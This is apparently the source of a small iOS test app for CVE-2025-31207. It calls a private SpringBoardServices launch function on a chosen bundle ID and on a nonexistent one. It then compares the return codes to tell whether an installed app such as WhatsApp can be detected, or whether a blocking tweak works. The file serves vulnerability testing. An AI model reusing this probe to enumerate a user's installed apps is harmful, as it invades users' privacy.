#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <limits.h>

typedef int (*SBSLaunchWithURLFn)(NSString *, NSURL *, NSDictionary *, NSDictionary *, BOOL);

static int QueryBundleIdentifier(NSString *bundleIdentifier) {
    static SBSLaunchWithURLFn launchFunction;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        void *handle = dlopen("/System/Library/PrivateFrameworks/SpringBoardServices.framework/SpringBoardServices",
                             RTLD_NOW | RTLD_LOCAL);
        if (handle != NULL) {
            launchFunction = (SBSLaunchWithURLFn)dlsym(
                handle, "SBSLaunchApplicationWithIdentifierAndURLAndLaunchOptions");
        }
    });

    if (launchFunction == NULL) {
        return INT_MIN;
    }
    return launchFunction(bundleIdentifier, nil, nil, nil, NO);
}

@interface TestViewController : UIViewController <UITextFieldDelegate>
@property(nonatomic, strong) UITextField *bundleField;
@property(nonatomic, strong) UILabel *resultLabel;
@end

@implementation TestViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = UIColor.systemBackgroundColor;

    UILabel *title = [UILabel new];
    title.translatesAutoresizingMaskIntoConstraints = NO;
    title.text = @"CVE-2025-31207 Test";
    title.font = [UIFont boldSystemFontOfSize:25];
    title.textAlignment = NSTextAlignmentCenter;

    UILabel *instructions = [UILabel new];
    instructions.translatesAutoresizingMaskIntoConstraints = NO;
    instructions.numberOfLines = 0;
    instructions.textAlignment = NSTextAlignmentCenter;
    instructions.text = @"WhatsApp installed:\n9 / 7 = vulnerable\n7 / 7 = tweak working";

    self.bundleField = [UITextField new];
    self.bundleField.translatesAutoresizingMaskIntoConstraints = NO;
    self.bundleField.borderStyle = UITextBorderStyleRoundedRect;
    self.bundleField.autocapitalizationType = UITextAutocapitalizationTypeNone;
    self.bundleField.autocorrectionType = UITextAutocorrectionTypeNo;
    self.bundleField.clearButtonMode = UITextFieldViewModeWhileEditing;
    self.bundleField.placeholder = @"Bundle identifier";
    self.bundleField.text = @"net.whatsapp.WhatsApp";
    self.bundleField.delegate = self;

    UIButton *testButton = [UIButton buttonWithType:UIButtonTypeSystem];
    testButton.translatesAutoresizingMaskIntoConstraints = NO;
    [testButton setTitle:@"Run comparison" forState:UIControlStateNormal];
    testButton.titleLabel.font = [UIFont boldSystemFontOfSize:18];
    [testButton addTarget:self action:@selector(runTest) forControlEvents:UIControlEventTouchUpInside];

    self.resultLabel = [UILabel new];
    self.resultLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.resultLabel.numberOfLines = 0;
    self.resultLabel.textAlignment = NSTextAlignmentCenter;
    self.resultLabel.font = [UIFont monospacedSystemFontOfSize:17 weight:UIFontWeightRegular];
    self.resultLabel.text = @"Ready";

    UIStackView *stack = [[UIStackView alloc] initWithArrangedSubviews:@[
        title, instructions, self.bundleField, testButton, self.resultLabel
    ]];
    stack.translatesAutoresizingMaskIntoConstraints = NO;
    stack.axis = UILayoutConstraintAxisVertical;
    stack.spacing = 20;
    [self.view addSubview:stack];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [stack.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:24],
        [stack.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-24],
        [stack.centerYAnchor constraintEqualToAnchor:safe.centerYAnchor],
        [self.bundleField.heightAnchor constraintEqualToConstant:44]
    ]];
}

- (void)runTest {
    [self.view endEditing:YES];
    NSString *target = [self.bundleField.text stringByTrimmingCharactersInSet:
                        NSCharacterSet.whitespaceAndNewlineCharacterSet];
    if (target.length == 0) {
        target = @"net.whatsapp.WhatsApp";
        self.bundleField.text = target;
    }

    NSString *missing = @"invalid.codex.appenumguard.7f0c2d3e";
    int targetResult = QueryBundleIdentifier(target);
    int missingResult = QueryBundleIdentifier(missing);

    if (targetResult == INT_MIN || missingResult == INT_MIN) {
        self.resultLabel.text = @"ERROR\nSpringBoardServices symbol unavailable";
        self.resultLabel.textColor = UIColor.systemOrangeColor;
    } else if (targetResult == 7 && missingResult == 7) {
        self.resultLabel.text = [NSString stringWithFormat:
            @"TARGET:  %d\nMISSING: %d\n\nPASS — no distinction", targetResult, missingResult];
        self.resultLabel.textColor = UIColor.systemGreenColor;
    } else if (targetResult == 9 && missingResult == 7) {
        self.resultLabel.text = [NSString stringWithFormat:
            @"TARGET:  %d\nMISSING: %d\n\nFAIL — installed app leaked", targetResult, missingResult];
        self.resultLabel.textColor = UIColor.systemRedColor;
    } else {
        self.resultLabel.text = [NSString stringWithFormat:
            @"TARGET:  %d\nMISSING: %d\n\nINCONCLUSIVE", targetResult, missingResult];
        self.resultLabel.textColor = UIColor.systemOrangeColor;
    }
}

- (BOOL)textFieldShouldReturn:(UITextField *)textField {
    [self runTest];
    return YES;
}

@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property(nonatomic, strong) UIWindow *window;
@end


@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [TestViewController new];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass(AppDelegate.class));
    }
}
